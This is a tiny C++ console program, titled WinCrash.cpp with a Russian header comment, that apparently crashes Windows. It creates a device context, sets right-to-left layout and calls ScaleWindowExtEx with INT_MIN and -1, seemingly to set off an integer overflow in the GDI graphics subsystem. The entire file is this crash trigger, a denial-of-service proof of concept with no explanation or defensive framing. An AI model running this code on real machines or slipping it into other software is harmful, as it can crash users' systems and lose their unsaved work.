// WinCrash.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#include <Windows.h>
#include <limits.h>


int _tmain()
{
	HDC dc = CreateCompatibleDC(NULL);
	SetLayout(dc,LAYOUT_RTL);
	ScaleWindowExtEx(dc,INT_MIN,-1,1,1,NULL);
	return 0;
}


